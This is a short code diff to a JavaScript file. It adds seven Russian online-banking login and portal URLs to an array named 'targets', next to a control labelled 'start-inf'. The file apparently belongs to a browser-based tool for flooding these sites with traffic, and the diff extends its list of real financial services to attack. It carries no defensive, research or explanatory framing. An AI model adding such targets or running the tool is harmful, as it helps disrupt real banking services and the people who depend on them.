@@ -70,6 +70,13 @@ let targets = [
   'https://acdn.tinkoff.ru',
   'http://stat.online.sberbank.ru/',
   'https://id.tinkoff.ru',
+  'https://online.vtb.ru',
+  'https://online.sberbank.ru/CSAFront/index.do#/',
+  'https://online.gpb.ru/login',
+  'https://alfabank.ru/everyday/online/',
+  'https://online.rshb.ru',
+  'https://online.sovcombank.ru/',
+  'https://online.mkb.ru/',
 ];
 
 const startInfMin = document.getElementById('start-inf');
